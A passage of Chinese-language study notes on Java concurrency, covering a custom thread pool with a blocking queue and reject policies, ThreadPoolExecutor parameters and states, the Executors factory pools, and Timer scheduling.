<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestFinal</span></span>&#123;</span><br><span class="line">    <span class="comment">//1.分配内存空间</span></span><br><span class="line">    <span class="comment">//2.初始化0</span></span><br><span class="line">    <span class="comment">//3.赋值20</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> a=<span class="number">20</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="https://csn.damyoung.cn/image-20201010152712727.png" alt="image-20201010152712727" style="zoom:80%;" />



<h3 id="七、线程池"><a href="#七、线程池" class="headerlink" title="七、线程池"></a>七、线程池</h3><h4 id="1、自定义线程池"><a href="#1、自定义线程池" class="headerlink" title="1、自定义线程池"></a>1、自定义线程池</h4><blockquote>
<p>基于生产消费者模式</p>
<p>Thread Pool  任务的消费者 &gt;&gt;&gt; Blocking Queue阻塞队列 &gt;&gt;&gt; main任务的生产者</p>
</blockquote>
<img src="https://csn.damyoung.cn/image-20201005130109179.png" alt="image-20201005130109179" style="zoom: 67%;" />

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> admin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestPool</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//创建线程池对象</span></span><br><span class="line">        ThreadPool threadPool=<span class="keyword">new</span> ThreadPool(<span class="number">1</span>,<span class="number">1000</span>,TimeUnit.MILLISECONDS,<span class="number">1</span>,(queue,task)-&gt;&#123;</span><br><span class="line">            <span class="comment">//1、死等</span></span><br><span class="line"><span class="comment">//            queue.put(task);</span></span><br><span class="line">            <span class="comment">//2.带超时等待</span></span><br><span class="line"><span class="comment">//            queue.offer(task,500,TimeUnit.MILLISECONDS);</span></span><br><span class="line">            <span class="comment">//3.放弃任务执行</span></span><br><span class="line"><span class="comment">//            System.out.println(task);</span></span><br><span class="line">            <span class="comment">//4.让调用自己抛出异常</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;任务执行失败&quot;</span>+task);        </span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;<span class="number">3</span> ; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> j=i;</span><br><span class="line">            threadPool.execute(()-&gt; &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(j);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@FunctionalInterface</span> <span class="comment">//拒绝策略</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">RejectPolicy</span>&lt;<span class="title">T</span>&gt;</span>&#123;</span><br><span class="line">      <span class="function"><span class="keyword">void</span> <span class="title">reject</span><span class="params">(BlockingQueue&lt;T&gt; queue,T task)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadPool</span></span>&#123;</span><br><span class="line">    <span class="comment">//任务队列</span></span><br><span class="line">    <span class="keyword">private</span> BlockingQueue&lt;Runnable&gt; taskQueue;</span><br><span class="line">    <span class="comment">//线程集合</span></span><br><span class="line">    <span class="keyword">private</span> HashSet&lt;Worker&gt; workers=<span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//核心线程数,即线程池大小</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> coreSize;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取超时时间数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> timeOut;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> TimeUnit timeUnit;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">//拒绝策略</span></span><br><span class="line">    <span class="keyword">private</span> RejectPolicy&lt;Runnable&gt; rejectPolicy;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 传入一个任务,并执行任务</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(Runnable task)</span></span>&#123;</span><br><span class="line">        <span class="comment">//1.当任务数没有超过coreSize时，直接交给worker对象执行</span></span><br><span class="line">        <span class="comment">//2.当任务数超过coreSize时，加入任务队列暂存</span></span><br><span class="line">        <span class="keyword">synchronized</span> (workers)&#123;</span><br><span class="line">            <span class="keyword">if</span> (workers.size()&lt;coreSize)&#123;</span><br><span class="line">                Worker worker= <span class="keyword">new</span> Worker(task);</span><br><span class="line">                </span><br><span class="line">                System.out.println(<span class="string">&quot;新增任务&quot;</span>+worker);</span><br><span class="line">                <span class="comment">//添加到线程集合中</span></span><br><span class="line">                workers.add(worker);</span><br><span class="line">                </span><br><span class="line">                worker.start();</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//1.队列满了就死等</span></span><br><span class="line"><span class="comment">//                taskQueue.put(task);</span></span><br><span class="line">                <span class="comment">//2.带超时等待</span></span><br><span class="line">                <span class="comment">//3.放弃任务执行</span></span><br><span class="line">                <span class="comment">//4.让调用自己抛出异常</span></span><br><span class="line">                <span class="comment">//5.让调用者自己执行</span></span><br><span class="line">                taskQueue.tryPut(rejectPolicy,task);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ThreadPool</span><span class="params">(<span class="keyword">int</span> coreSize, <span class="keyword">long</span> timeOut, TimeUnit timeUnit,<span class="keyword">int</span> capacity,RejectPolicy&lt;Runnable&gt; 							rejectPolicy)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.coreSize = coreSize;</span><br><span class="line">        <span class="keyword">this</span>.timeOut = timeOut;</span><br><span class="line">        <span class="keyword">this</span>.timeUnit = timeUnit;</span><br><span class="line">        <span class="keyword">this</span>.taskQueue=<span class="keyword">new</span> BlockingQueue&lt;&gt;(capacity);</span><br><span class="line">        <span class="keyword">this</span>.rejectPolicy=rejectPolicy;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Worker</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> Runnable task;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Worker</span><span class="params">(Runnable task)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.task = task;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="comment">//执行任务</span></span><br><span class="line">            <span class="comment">//1.当task不为空，执行任务</span></span><br><span class="line">            <span class="comment">//2.当task执行完毕，在接着从任务队列中获取任务并执行</span></span><br><span class="line"><span class="comment">//            while(task !=null ||(task=taskQueue.take())!=null )&#123;</span></span><br><span class="line">            <span class="comment">//超时限制获取策略</span></span><br><span class="line">            <span class="keyword">while</span>(task !=<span class="keyword">null</span> ||(task=taskQueue.poll(timeOut,timeUnit))!=<span class="keyword">null</span> )&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;正在执行&quot;</span>+task);</span><br><span class="line">                    task.run();</span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">                    task=<span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//当任务队列的任务执行完毕时。从线程集合中移除</span></span><br><span class="line">            <span class="keyword">synchronized</span> (workers)&#123;</span><br><span class="line">                workers.remove(<span class="keyword">this</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 阻塞队列</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &lt;T&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BlockingQueue</span>&lt;<span class="title">T</span>&gt;</span>&#123;</span><br><span class="line">    <span class="comment">//1.任务队列(Deque双向队列)_</span></span><br><span class="line">    <span class="keyword">private</span> Deque&lt;T&gt; queue=<span class="keyword">new</span> ArrayDeque&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.锁，线程安全</span></span><br><span class="line">    <span class="keyword">private</span> ReentrantLock lock=<span class="keyword">new</span> ReentrantLock();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3.生产者条件变量</span></span><br><span class="line">    <span class="keyword">private</span> Condition fullWaitSet=lock.newCondition();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//4.消费者条件变量</span></span><br><span class="line">    <span class="keyword">private</span> Condition emptyWaitSet=lock.newCondition();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//5.队列容量</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> capcity;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BlockingQueue</span><span class="params">(<span class="keyword">int</span> capcity)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.capcity = capcity;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 带超时的阻塞获取</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> T <span class="title">poll</span><span class="params">(<span class="keyword">long</span> timeout, TimeUnit unit)</span></span>&#123;</span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//将timeout转化未纳秒</span></span><br><span class="line">            <span class="keyword">long</span> nanos=unit.toNanos(timeout);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (queue.isEmpty())&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (nanos&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">//返回是剩余时间</span></span><br><span class="line">                    nanos = emptyWaitSet.awaitNanos(nanos);</span><br><span class="line">                &#125;<span class="keyword">catch</span> (InterruptedException e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//获取队列第一个元素</span></span><br><span class="line">            T t = queue.removeFirst();</span><br><span class="line">            <span class="comment">//唤醒生产者条件变量</span></span><br><span class="line">            fullWaitSet.signal();</span><br><span class="line">            <span class="keyword">return</span> t;</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 阻塞任务获取</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> T <span class="title">take</span><span class="params">()</span></span>&#123;</span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> (queue.isEmpty())&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    emptyWaitSet.await();</span><br><span class="line">                &#125;<span class="keyword">catch</span> (InterruptedException e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//获取队列第一个元素</span></span><br><span class="line">            T t = queue.removeFirst();</span><br><span class="line">            <span class="comment">//唤醒生产者条件变量</span></span><br><span class="line">            fullWaitSet.signal();</span><br><span class="line">            <span class="keyword">return</span> t;</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 带超时的阻塞添加</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 成功true</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">offer</span><span class="params">(T task,<span class="keyword">long</span> timeout,TimeUnit timeUnit)</span></span>&#123;</span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//将timeout转化为纳秒</span></span><br><span class="line">            <span class="keyword">long</span> nanos=timeUnit.toNanos(timeout);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (queue.size()==capcity)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;等待加入任务队列&quot;</span>+task);</span><br><span class="line">                    <span class="keyword">if</span> (nanos&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    nanos = fullWaitSet.awaitNanos(nanos);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;加入任务队列&quot;</span>+task);</span><br><span class="line">            queue.addLast(task);</span><br><span class="line">            <span class="comment">//唤醒消费者条件变量</span></span><br><span class="line">            emptyWaitSet.signal();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 阻塞添加</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">put</span><span class="params">(T element)</span></span>&#123;</span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> (queue.size()==capcity)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;等待加入任务队列&quot;</span>+element);</span><br><span class="line">                    fullWaitSet.await();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;加入任务队列&quot;</span>+element);</span><br><span class="line">            queue.addLast(element);</span><br><span class="line">            <span class="comment">//唤醒消费者条件变量</span></span><br><span class="line">            emptyWaitSet.signal();</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取大小</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">size</span><span class="params">()</span></span>&#123;</span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> queue.size();</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">tryPut</span><span class="params">(RejectPolicy&lt;T&gt; rejectPolicy,T task)</span></span>&#123;</span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//判断队列是否已满</span></span><br><span class="line">            <span class="keyword">if</span> (queue.size()==capcity)&#123;</span><br><span class="line">                rejectPolicy.reject(<span class="keyword">this</span>,task);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;加入任务队列&quot;</span>+task);</span><br><span class="line">                queue.addLast(task);</span><br><span class="line">                <span class="comment">//唤醒消费者条件变量</span></span><br><span class="line">                emptyWaitSet.signal();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="2、ThreadPoolExecutor"><a href="#2、ThreadPoolExecutor" class="headerlink" title="2、ThreadPoolExecutor"></a>2、ThreadPoolExecutor</h4><img src="https://csn.damyoung.cn/image-20201005170916502.png" alt="image-20201005170916502" style="zoom:67%;" />



<blockquote>
<p>线程池的顶级接口是<code>Executor</code>,<strong>管理多个异步任务的执行，而无需程序员显式的管理线程的生命周期</strong>。</p>
<p>线程池的顶级接口是<code>Executor</code>,线程池接口是<code>ExecutorService</code></p>
</blockquote>
<h5 id="2-1-线程池状态"><a href="#2-1-线程池状态" class="headerlink" title="2.1  线程池状态"></a>2.1  线程池状态</h5><blockquote>
<p>使用int(4个字节) 的高3位(有符号位)来表示线程状态，低29位表示线程数量</p>
<p><strong>目的:</strong> 存储在一个原子变量ctl中，目的是将线程池状态与线程个数合二为一，这样就可以使用一次CAS原子操作进行赋值。</p>
</blockquote>
<img src="https://csn.damyoung.cn/image-20201005171216379.png" alt="image-20201005171216379" style="zoom:67%;" />

<h5 id="2-2-构造方法以及创建线程方法"><a href="#2-2-构造方法以及创建线程方法" class="headerlink" title="2.2 构造方法以及创建线程方法"></a>2.2 构造方法以及创建线程方法</h5><h6 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h6><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ThreadPoolExecutor</span><span class="params">(<span class="keyword">int</span> corePoolSize,</span></span></span><br><span class="line"><span class="function"><span class="params">                          <span class="keyword">int</span> maximumPoolSize,</span></span></span><br><span class="line"><span class="function"><span class="params">                          <span class="keyword">long</span> keepAliveTime,</span></span></span><br><span class="line"><span class="function"><span class="params">                          TimeUnit unit,</span></span></span><br><span class="line"><span class="function"><span class="params">                          BlockingQueue&lt;Runnable&gt; workQueue,</span></span></span><br><span class="line"><span class="function"><span class="params">                          ThreadFactory threadFactory,</span></span></span><br><span class="line"><span class="function"><span class="params">                          RejectedExecutionHandler handler)</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>corePoolSize 核心线程数目</li>
<li>maximumPoolSize 最大线程数</li>
<li>keepAliveTime  生存时间-针对救急线程</li>
<li>unit 时间单位-针对救急线程</li>
<li>workQueue 阻塞队列</li>
<li>threadFactory 线程工厂-可以为线程创建时起个好名字</li>
<li>handler 拒绝策略</li>
</ul>
<blockquote>
<p>ThreadPoolExecutor 线程池中存在核心线程和救急线程==&gt;最大线程数</p>
<ul>
<li><p>当**阻塞队列满(配合有界队列)**时，又有新任务，才会动用救急线程，救急线程有生存时间。</p>
</li>
<li><p>当救急线程也满时，才会执行<strong>拒绝策略</strong></p>
<p>jdk:</p>
<ul>
<li>AbortPolicy 抛出RejectExecutionException异常，默认策略</li>
<li>CallerRunsPolicy 让调用者运行任务</li>
<li>DiscardPolicy 放弃本次任务</li>
<li>DiscardOldestPolicy 放弃队列中最早的任务，本任务取而代之</li>
</ul>
</li>
</ul>
</blockquote>
<img src="https://csn.damyoung.cn/image-20201005174351695.png" alt="image-20201005174351695" style="zoom: 67%;" />

<h6 id="Executors"><a href="#Executors" class="headerlink" title="Executors"></a>Executors</h6><blockquote>
<p><strong>通过<code>Executor</code>框架的工具类<code>Executors</code>来实现</strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ExecutorService executorService = Executors.newFixedThreadPool(<span class="number">2</span>, <span class="keyword">new</span> ThreadFactory() &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> AtomicInteger t=<span class="keyword">new</span> AtomicInteger(<span class="number">1</span>);</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Thread <span class="title">newThread</span><span class="params">(Runnable r)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Thread(r,<span class="string">&quot;myPool_t&quot;</span>+t.getAndIncrement());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p><strong><code>Executors</code>返回线程池对象的弊端如下：</strong></p>
<ul>
<li><code>FixedThreadPool</code>和<code>SingleThreadExecutor</code>：允许请求的队列长度为<code>Integer.MAX_VALUE</code>，可能堆积大量的请求，从而导致OOM。</li>
<li><code>CacheThreadPool</code>和<code>ScheduledThreadPool</code>：允许创建的线程数量为<code>Integer.MAX_VALUE</code>，可能会创建大量线程，从而导致OOM</li>
</ul>
<h5 id="2-3-四种线程池"><a href="#2-3-四种线程池" class="headerlink" title="2.3 四种线程池"></a>2.3 四种线程池</h5><h6 id="2-3-newFixedThreadPool"><a href="#2-3-newFixedThreadPool" class="headerlink" title="2.3 newFixedThreadPool"></a>2.3 newFixedThreadPool</h6><blockquote>
<p>固定大小的线程池，适用于<strong>任务量已知，相对耗时</strong>的任务</p>
</blockquote>
<p>特点</p>
<ul>
<li>核心线程数==最大线程数(没有救急线程被创建)，因此也无需超时时间</li>
<li>阻塞队列是无界的，可以放任意数量的任务。</li>
<li>当某个线程执行出现异常而结束，线程池会补充一个新的线程</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ExecutorService executorService = Executors.newFixedThreadPool(<span class="number">2</span>, <span class="keyword">new</span> ThreadFactory() &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> AtomicInteger t=<span class="keyword">new</span> AtomicInteger(<span class="number">1</span>);</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Thread <span class="title">newThread</span><span class="params">(Runnable r)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Thread(r,<span class="string">&quot;myPool_t&quot;</span>+t.getAndIncrement());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">executorService.execute(()-&gt;&#123;</span><br><span class="line">    System.out.println(Thread.currentThread().getName());</span><br><span class="line">&#125;);</span><br><span class="line">executorService.execute(()-&gt;&#123;</span><br><span class="line">    System.out.println(Thread.currentThread().getName());</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h6 id="2-4-newCachedThreadPool"><a href="#2-4-newCachedThreadPool" class="headerlink" title="2.4 newCachedThreadPool"></a>2.4 newCachedThreadPool</h6><blockquote>
<p>核心线程数是0，最大线程数是Integer.MAX_VALUE。</p>
<ul>
<li>全部是救急线程(当线程空闲时，60s后会进行回收)</li>
<li>救急线程可以无限创建</li>
</ul>
<p>队列采用SynchronousQueue，没有容量，没有线程来取是放不进去的</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ExecutorService <span class="title">newCachedThreadPool</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ThreadPoolExecutor(<span class="number">0</span>, Integer.MAX_VALUE,</span><br><span class="line">                                  <span class="number">60L</span>, TimeUnit.SECONDS,</span><br><span class="line">                                  <span class="keyword">new</span> SynchronousQueue&lt;Runnable&gt;());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>适用于<strong>任务数比较密集，每个任务执行时间短</strong></p>
</blockquote>
<h6 id="2-5-newSingleThreadExecutor"><a href="#2-5-newSingleThreadExecutor" class="headerlink" title="2.5 newSingleThreadExecutor"></a>2.5 newSingleThreadExecutor</h6><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ExecutorService <span class="title">newSingleThreadExecutor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> FinalizableDelegatedExecutorService</span><br><span class="line">        (<span class="keyword">new</span> ThreadPoolExecutor(<span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                                <span class="number">0L</span>, TimeUnit.MILLISECONDS,</span><br><span class="line">                                <span class="keyword">new</span> LinkedBlockingQueue&lt;Runnable&gt;()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>保证所有任务的执行顺序按照任务的提交顺序执行</strong>，线程固定为1，多于1时，会放入<strong>无界队列</strong>排队。</p>
<p>任务执行完毕，这唯一的线程也不会被释放</p>
</blockquote>
<p><strong>区别</strong></p>
<ul>
<li>自己创建一个单线程串行执行，执行失败而终止而没有任何补救措施。而线程池还会创建新线程补救</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ExecutorService executorService = Executors.newSingleThreadExecutor();</span><br><span class="line">executorService.execute(()-&gt;&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">1</span>/<span class="number">0</span>;</span><br><span class="line">&#125;);</span><br><span class="line">executorService.execute(()-&gt;&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">executorService.execute(()-&gt;&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;3&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<ul>
<li>Executors.newSingleThreadExecutor 线程数始终为1，<strong>不能修改</strong><ul>
<li>应用装饰器模式，只对外暴露<code>ExecutorService</code>接口，不能调用<code>ThreadPoolExecutor</code>特有方法</li>
</ul>
</li>
<li>Executors.newFixedThreadPool(1)初始时为1，以后<strong>还可以修改</strong><ul>
<li>对外暴露的是<code>ThreadPoolExecutor</code>对象，强转后调用setCorePoolSize等方法进行修改。</li>
</ul>
</li>
</ul>
<h6 id="2-6-任务调度线程池"><a href="#2-6-任务调度线程池" class="headerlink" title="2.6 任务调度线程池"></a>2.6 任务调度线程池</h6><blockquote>
<p><strong>支持定时以及周期性执行任务的需求</strong></p>
</blockquote>
<p>Timer</p>
<blockquote>
<p>java.util.Timer</p>
<p><strong>实现定时功能</strong>，但由于所有的任务都是由同一个线程调度，因此所有任务都是<strong>串行执行</strong>的</p>
<p>同一个时间只能有一个任务在执行，前一个任务的延迟或异常都会影响到之后的任务。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Timer timer=<span class="keyword">new</span> Timer();</span><br><span class="line">TimerTask timerTask1 = <span class="keyword">new</span> TimerTask() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Timer任务1&quot;</span>);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">TimerTask timerTask2 = <span class="keyword">new</span> TimerTask() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Timer任务2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">timer.schedule(timerTask1,<span class="number">1000</span>);</span><br><span class="line">timer.schedule(timerTask2,<span class="number">1000</span>);</span><br></pre></td></tr></table></figure>

<p>newScheduledThreadPool</p>
<p><strong>延时执行</strong></p>
